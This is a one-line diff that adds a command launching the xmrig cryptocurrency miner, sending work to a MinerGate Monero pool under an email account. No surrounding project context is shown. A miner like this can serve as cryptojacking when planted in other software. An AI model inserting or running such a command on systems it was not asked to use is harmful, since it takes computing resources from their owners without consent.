@@ -1,0 +1,1 @@
+xmrig.exe -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u flagslona@gmail.com -p x
